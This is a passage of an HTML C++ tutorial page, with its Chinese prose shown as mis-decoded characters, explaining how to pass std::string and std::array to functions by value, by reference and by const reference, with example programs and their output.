&quot;Hello&quot;</span><br><span class="line">Inside function (reference): &quot;Hello&quot;</span><br><span class="line">Modified original via reference: &quot;Hello World&quot;</span><br><span class="line">After call: &quot;Hello World&quot;</span><br></pre></td></tr></table></figure><h3 id="æŒ‰å¸¸é‡å¼•ç”¨ä¼ é€’-std-string-æ¨èæ–¹å¼"><a href="#æŒ‰å¸¸é‡å¼•ç”¨ä¼ é€’-std-string-æ¨èæ–¹å¼" class="headerlink" title="æŒ‰å¸¸é‡å¼•ç”¨ä¼ é€’ std::string (æ¨èæ–¹å¼)"></a>æŒ‰å¸¸é‡å¼•ç”¨ä¼ é€’ <code>std::string</code> (æ¨èæ–¹å¼)</h3><p>å¦‚æœå‡½æ•°éœ€è¦è¯»å– <code>string</code> çš„å†…å®¹ä½†ä¸éœ€è¦ä¿®æ”¹å®ƒï¼Œæœ€ä½³å®è·µæ˜¯ä½¿ç”¨**æŒ‰å¸¸é‡å¼•ç”¨ä¼ é€’ (Pass by Constant Reference)**ã€‚è¿™æä¾›äº†æŒ‰å¼•ç”¨ä¼ é€’çš„æ•ˆç‡ï¼ˆé¿å…å¤åˆ¶ï¼‰ï¼ŒåŒæ—¶å…·æœ‰æŒ‰å€¼ä¼ é€’çš„å®‰å…¨æ€§ï¼ˆé˜²æ­¢å‡½æ•°ä¿®æ”¹åŸå§‹æ•°æ®ï¼‰ã€‚</p><p><strong>ç¤ºä¾‹ï¼šæŒ‰å¸¸é‡å¼•ç”¨ä¼ é€’ <code>std::string</code></strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°ï¼šæŒ‰å¸¸é‡å¼•ç”¨æ¥æ”¶ string å¯¹è±¡</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display_string_const_ref</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; str_cref)</span> </span>&#123; <span class="comment">// str_cref æ˜¯ message çš„å¸¸é‡åˆ«å</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside function (const reference): \&quot;&quot;</span> &lt;&lt; str_cref &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// str_cref[0] = &#x27;J&#x27;; // é”™è¯¯ï¼ä¸èƒ½é€šè¿‡å¸¸é‡å¼•ç”¨ä¿®æ”¹å¯¹è±¡</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;String length: &quot;</span> &lt;&lt; str_cref.length() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> message = <span class="string">&quot;Hello C++&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Before call: \&quot;&quot;</span> &lt;&lt; message &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    display_string_const_ref(message); <span class="comment">// ä¼ é€’å¸¸é‡å¼•ç”¨</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After call: \&quot;&quot;</span> &lt;&lt; message &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// åŸå§‹ string æœªæ”¹å˜</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¹Ÿå¯ä»¥ä¼ é€’å­—ç¬¦ä¸²å­—é¢å€¼ï¼Œå®ƒä»¬ä¼šè‡ªåŠ¨è½¬æ¢ä¸ºä¸´æ—¶çš„ string å¯¹è±¡</span></span><br><span class="line">    display_string_const_ref(<span class="string">&quot;Temporary String&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡º:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Before call: &quot;Hello C++&quot;</span><br><span class="line">Inside function (const reference): &quot;Hello C++&quot;</span><br><span class="line">String length: 9</span><br><span class="line">After call: &quot;Hello C++&quot;</span><br><span class="line">Inside function (const reference): &quot;Temporary String&quot;</span><br><span class="line">String length: 16</span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“ä¼ é€’æ–¹å¼:</strong></p><ul><li>  <strong>æŒ‰å€¼ (<code>std::string str</code>)</strong>: åˆ›å»ºå‰¯æœ¬ï¼Œå®‰å…¨ä½†å¯èƒ½ä½æ•ˆã€‚</li><li>  <strong>æŒ‰å¼•ç”¨ (<code>std::string&amp; str</code>)</strong>: ä¸åˆ›å»ºå‰¯æœ¬ï¼Œé«˜æ•ˆï¼Œå…è®¸ä¿®æ”¹åŸå§‹å¯¹è±¡ã€‚</li><li>  <strong>æŒ‰å¸¸é‡å¼•ç”¨ (<code>const std::string&amp; str</code>)</strong>: ä¸åˆ›å»ºå‰¯æœ¬ï¼Œé«˜æ•ˆï¼Œä¸å…è®¸ä¿®æ”¹åŸå§‹å¯¹è±¡ã€‚<strong>è¿™æ˜¯å°†å­—ç¬¦ä¸²ä¼ é€’ç»™å‡½æ•°è¿›è¡Œåªè¯»è®¿é—®çš„æœ€å¸¸ç”¨å’Œæ¨èçš„æ–¹å¼ã€‚</strong></li></ul><h3 id="è¿”å›-std-string-å¯¹è±¡"><a href="#è¿”å›-std-string-å¯¹è±¡" class="headerlink" title="è¿”å› std::string å¯¹è±¡"></a>è¿”å› <code>std::string</code> å¯¹è±¡</h3><p>å‡½æ•°ä¹Ÿå¯ä»¥è¿”å› <code>std::string</code> å¯¹è±¡ã€‚é€šå¸¸ç›´æ¥æŒ‰å€¼è¿”å›å³å¯ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°ï¼šåˆ›å»ºä¸€ä¸ªé—®å€™è¯­å­—ç¬¦ä¸²å¹¶è¿”å›</span></span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">create_greeting</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; name)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> result = <span class="string">&quot;Hello, &quot;</span> + name + <span class="string">&quot;!&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> result; <span class="comment">// è¿”å› string å¯¹è±¡</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> user_name = <span class="string">&quot;Alice&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> greeting = create_greeting(user_name);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; greeting &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: Hello, Alice!</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è™½ç„¶çœ‹èµ·æ¥è¿™é‡Œä¹Ÿæ¶‰åŠå¤åˆ¶ï¼ˆè¿”å› <code>result</code> çš„å‰¯æœ¬ï¼‰ï¼Œä½†ç°ä»£ C++ ç¼–è¯‘å™¨é€šå¸¸ä¼šåº”ç”¨<strong>è¿”å›å€¼ä¼˜åŒ– (RVO)</strong> æˆ–**å‘½åè¿”å›å€¼ä¼˜åŒ– (NRVO)**ã€‚è¿™äº›ä¼˜åŒ–å¯ä»¥é¿å…åœ¨è¿”å› <code>string</code>ï¼ˆæˆ–å…¶ä»–å¯¹è±¡ï¼‰æ—¶è¿›è¡Œå®é™…çš„å¤åˆ¶ï¼Œä½¿å¾—æŒ‰å€¼è¿”å› <code>std::string</code> éå¸¸é«˜æ•ˆã€‚</p><p><strong>ä¸ C-é£æ ¼å­—ç¬¦ä¸²çš„æ¯”è¾ƒ:</strong></p><p>ä½¿ç”¨ <code>std::string</code> å¯¹è±¡ä¸å‡½æ•°äº¤äº’æ¯”ä½¿ç”¨ C-é£æ ¼å­—ç¬¦ä¸² (<code>char*</code>) ç®€å•å¾—å¤šï¼š</p><ul><li>  ä¸éœ€è¦æ‹…å¿ƒç©ºå­—ç¬¦ <code>\0</code>ã€‚</li><li>  ä¸éœ€è¦æ‰‹åŠ¨ç®¡ç†å†…å­˜ï¼ˆ<code>new</code>/<code>delete[]</code>ï¼‰ã€‚</li><li>  ä¸éœ€è¦å•ç‹¬ä¼ é€’å¤§å°ï¼ˆ<code>string</code> å¯¹è±¡çŸ¥é“è‡ªå·±çš„å¤§å°ï¼‰ã€‚</li><li>  æŒ‰å¼•ç”¨ï¼ˆå°¤å…¶æ˜¯å¸¸é‡å¼•ç”¨ï¼‰ä¼ é€’é¿å…äº†å¤åˆ¶å¼€é”€ï¼ŒåŒæ—¶ä¿æŒäº†ä»£ç çš„æ¸…æ™°å’Œå®‰å…¨ã€‚</li><li>  è¿”å›å€¼ä¼˜åŒ–ä½¿å¾—æŒ‰å€¼è¿”å› <code>string</code> é€šå¸¸å¾ˆé«˜æ•ˆã€‚</li></ul><p>å› æ­¤ï¼Œåœ¨ç°ä»£ C++ ä¸­ï¼Œå¼ºçƒˆæ¨èä½¿ç”¨ <code>std::string</code> è€Œä¸æ˜¯ C-é£æ ¼å­—ç¬¦ä¸²æ¥å¤„ç†æ–‡æœ¬æ•°æ®ã€‚</p><h2 id="7-8-å‡½æ•°ä¸-array-å¯¹è±¡"><a href="#7-8-å‡½æ•°ä¸-array-å¯¹è±¡" class="headerlink" title="7.8 å‡½æ•°ä¸ array å¯¹è±¡"></a>7.8 å‡½æ•°ä¸ array å¯¹è±¡</h2><p>C++11 å¼•å…¥äº† <code>std::array</code> æ¨¡æ¿ç±»ï¼ˆåœ¨ <code>&lt;array&gt;</code> å¤´æ–‡ä»¶ä¸­å®šä¹‰ï¼‰ï¼Œå®ƒæä¾›äº†ä¸€ç§æ›´å®‰å…¨ã€æ›´æ–¹ä¾¿çš„æ–¹å¼æ¥è¡¨ç¤ºå›ºå®šå¤§å°çš„æ•°ç»„ã€‚ä¸ C é£æ ¼æ•°ç»„ä¼šâ€œé€€åŒ–â€æˆæŒ‡é’ˆä¸åŒï¼Œ<code>std::array</code> å¯¹è±¡è¡¨ç°å¾—æ›´åƒæ™®é€šçš„ç±»å¯¹è±¡ï¼ˆç±»ä¼¼äºç»“æ„ä½“ï¼‰ã€‚</p><p><strong>å…³é”®ç‰¹æ€§:</strong></p><ul><li>  <code>std::array</code> å°è£…äº†ä¸€ä¸ªå›ºå®šå¤§å°çš„ C é£æ ¼æ•°ç»„ã€‚</li><li>  å…¶å¤§å°æ˜¯ç±»å‹ä¿¡æ¯çš„ä¸€éƒ¨åˆ†ï¼ˆä¾‹å¦‚ <code>std::array&lt;int, 5&gt;</code> å’Œ <code>std::array&lt;int, 10&gt;</code> æ˜¯ä¸åŒçš„ç±»å‹ï¼‰ã€‚</li><li>  å®ƒæä¾›äº†æˆå‘˜å‡½æ•°ï¼ˆå¦‚ <code>size()</code>, <code>at()</code>, <code>front()</code>, <code>back()</code>ï¼‰å’Œå¯¹è¿­ä»£å™¨çš„æ”¯æŒã€‚</li><li>  å®ƒä¸ä¼šè‡ªåŠ¨é€€åŒ–ä¸ºæŒ‡é’ˆã€‚</li></ul><h3 id="ä¼ é€’-std-array-å¯¹è±¡"><a href="#ä¼ é€’-std-array-å¯¹è±¡" class="headerlink" title="ä¼ é€’ std::array å¯¹è±¡"></a>ä¼ é€’ <code>std::array</code> å¯¹è±¡</h3><p>ç”±äº <code>std::array</code> è¡¨ç°å¾—åƒä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒé»˜è®¤æ˜¯<strong>æŒ‰å€¼ä¼ é€’ (Pass by Value)</strong> ç»™å‡½æ•°çš„ã€‚è¿™æ„å‘³ç€å½“å°†ä¸€ä¸ª <code>array</code> å¯¹è±¡ä¼ é€’ç»™å‡½æ•°æ—¶ï¼Œä¼šåˆ›å»ºè¯¥å¯¹è±¡çš„å®Œæ•´<strong>å‰¯æœ¬</strong>ã€‚</p><p><strong>ç¤ºä¾‹ï¼šæŒ‰å€¼ä¼ é€’ <code>std::array</code></strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;array&gt; // åŒ…å« array å¤´æ–‡ä»¶</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;numeric&gt; // ä¸ºäº† std::accumulate</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰ä¸€ä¸ªåŒ…å« 5 ä¸ª double çš„ array ç±»å‹åˆ«å</span></span><br><span class="line"><span class="keyword">using</span> FiveDoubles = <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">double</span>, <span class="number">5</span>&gt;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°ï¼šæŒ‰å€¼æ¥æ”¶ array å¯¹è±¡ï¼Œè®¡ç®—æ€»å’Œ</span></span><br><span class="line"><span class="comment">// arr æ˜¯ data çš„å‰¯æœ¬</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">sum_array_value</span><span class="params">(FiveDoubles arr)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside function (value): Modifying copy...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    arr[<span class="number">0</span>] = <span class="number">1000.0</span>; <span class="comment">// ä¿®æ”¹å‰¯æœ¬ï¼Œä¸å½±å“åŸå§‹ array</span></span><br><span class="line">    <span class="keyword">double</span> sum = <span class="number">0.0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">double</span> x : arr) &#123;</span><br><span class="line">        sum += x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æˆ–è€…ä½¿ç”¨ std::accumulate(arr.begin(), arr.end(), 0.0);</span></span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    FiveDoubles data = &#123;<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Before call, data[0] = &quot;</span> &lt;&lt; data[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">double</span> total = sum_array_value(data);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After call, data[0] = &quot;</span> &lt;&lt; data[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// åŸå§‹ array æœªæ”¹å˜</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sum calculated by value: &quot;</span> &lt;&lt; total &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡º:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Before call, data[0] &#x3D; 1.1</span><br><span class="line">Inside function (value): Modifying copy...</span><br><span class="line">After call, data[0] &#x3D; 1.1</span><br><span class="line">Sum calculated by value: 1015.4</span><br></pre></td></tr></table></figure><p><strong>æŒ‰å€¼ä¼ é€’ <code>std::array</code> çš„é—®é¢˜:</strong></p><p>ä¸ <code>std::string</code> å’Œå¤§å‹ç»“æ„ä½“ç±»ä¼¼ï¼Œå¦‚æœ <code>std::array</code> å¾ˆå¤§ï¼ŒæŒ‰å€¼ä¼ é€’ä¼šå¤åˆ¶æ•´ä¸ªæ•°ç»„å†…å®¹ï¼Œå¯¼è‡´æ€§èƒ½å¼€é”€ã€‚</p><h3 id="æŒ‰å¼•ç”¨ä¼ é€’-std-array"><a href="#æŒ‰å¼•ç”¨ä¼ é€’-std-array" class="headerlink" title="æŒ‰å¼•ç”¨ä¼ é€’ std::array"></a>æŒ‰å¼•ç”¨ä¼ é€’ <code>std::array</code></h3><p>ä¸ºäº†é¿å…å¤åˆ¶å¼€é”€å¹¶å…è®¸å‡½æ•°ä¿®æ”¹åŸå§‹ <code>array</code> å¯¹è±¡ï¼Œå¯ä»¥ä½¿ç”¨**æŒ‰å¼•ç”¨ä¼ é€’ (Pass by Reference)**ã€‚</p><p><strong>ç¤ºä¾‹ï¼šæŒ‰å¼•ç”¨ä¼ é€’ <code>std::array</code></strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;array&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> FiveDoubles = <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">double</span>, <span class="number">5</span>&gt;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°ï¼šæŒ‰å¼•ç”¨æ¥æ”¶ array å¯¹è±¡ï¼Œå¹¶å°†æ‰€æœ‰å…ƒç´ ä¹˜ä»¥å› å­</span></span><br><span class="line"><span class="comment">// arr_ref æ˜¯ data çš„åˆ«å</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">scale_array_ref</span><span class="params">(FiveDoubles&amp; arr_ref, <span class="keyword">double</span> factor)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside function (reference): Scaling original array...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">double</span>&amp; x : arr_ref) &#123; <span class="comment">// ä½¿ç”¨å¼•ç”¨è®¿é—®å…ƒç´ ä»¥ä¿®æ”¹å®ƒä»¬</span></span><br><span class="line">        x *= factor;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    FiveDoubles data = &#123;<span class="number">1.0</span>, <span class="number">2.0</span>, <span class="number">3.0</span>, <span class="number">4.0</span>, <span class="number">5.0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Before call: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">double</span> x : data) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    scale_array_ref(data, <span class="number">10.0</span>); <span class="comment">// ä¼ é€’å¼•ç”¨</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After call: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">double</span> x : data) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// åŸå§‹ array å·²è¢«ä¿®æ”¹</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡º:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Before call: 1 2 3 4 5</span><br><span class="line">Inside function (reference): Scaling original array...</span><br><span class="line">After call: 10 20 30 40 50</span><br></pre></td></tr></table></figure><h3 id="æŒ‰å¸¸é‡å¼•ç”¨ä¼ é€’-std-array-æ¨èæ–¹å¼"><a href="#æŒ‰å¸¸é‡å¼•ç”¨ä¼ é€’-std-array-æ¨èæ–¹å¼" class="headerlink" title="æŒ‰å¸¸é‡å¼•ç”¨ä¼ é€’ std::array (æ¨èæ–¹å¼)"></a>æŒ‰å¸¸é‡å¼•ç”¨ä¼ é€’ <code>std::array</code> (æ¨èæ–¹å¼)</h3><p>å¦‚æœå‡½æ•°åªéœ€è¦è¯»å– <code>array</code> çš„å†…å®¹è€Œä¸éœ€è¦ä¿®æ”¹å®ƒï¼Œæœ€ä½³å®è·µæ˜¯ä½¿ç”¨**æŒ‰å¸¸é‡å¼•ç”¨ä¼ é€’ (Pass by Constant Reference)**ã€‚è¿™æä¾›äº†æ•ˆç‡ï¼ˆé¿å…å¤åˆ¶ï¼‰å’Œå®‰å…¨æ€§ï¼ˆé˜²æ­¢ä¿®æ”¹ï¼‰ã€‚</p><p><strong>ç¤ºä¾‹ï¼šæŒ‰å¸¸é‡å¼•ç”¨ä¼ é€’ <code>std::array</code></strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;array&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> FiveDoubles = <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">double</span>, <span class="number">5</span>&gt;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°ï¼šæŒ‰å¸¸é‡å¼•ç”¨æ¥æ”¶ array å¯¹è±¡ï¼Œå¹¶æ‰“å°å®ƒ</span></span><br><span class="line"><span class="comment">// arr_cref æ˜¯ data çš„å¸¸é‡åˆ«å</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_array_const_ref</span><span class="params">(<span class="keyword">const</span> FiveDoubles&amp; arr_cref)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside function (const reference): Array elements are: &quot;</span>;</span><br><span class="line">    <span class="comment">// arr_cref[0] = 0.0; // é”™è¯¯ï¼ä¸èƒ½é€šè¿‡å¸¸é‡å¼•ç”¨ä¿®æ”¹</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">double</span> x : arr_cref) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;(Size: &quot;</span> &lt;&lt; arr_cref.size() &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    FiveDoubles data = &#123;<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>&#125;;</span><br><span class="line"></span><br><span class="line">    print_array_const_ref(data); <span class="comment">// ä¼ é€’å¸¸é‡å¼•ç”¨</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// åŸå§‹ array æœªæ”¹å˜</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Back in main, data[0] = &quot;</span> &lt;&lt; data[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡º:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Inside function (const reference): Array elements are: 1.1 2.2 3.3 4.4 5.5 (Size: 5)</span><br><span class="line">Back in main, data[0] &#x3D; 1.1</span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“ä¼ é€’æ–¹å¼:</strong></p><ul><li>  <strong>æŒ‰å€¼ (<code>std::array&lt;T, N&gt; arr</code>)</strong>: åˆ›å»ºå‰¯æœ¬ï¼Œå®‰å…¨ä½†å¯èƒ½ä½æ•ˆã€‚</li><li>  <strong>æŒ‰å¼•ç”¨ (<code>std::array&lt;T, N&gt;&amp; arr</code>)</strong>: ä¸åˆ›å»ºå‰¯æœ¬ï¼Œé«˜æ•ˆï¼Œå…è®¸ä¿®æ”¹ã€‚</li><li>  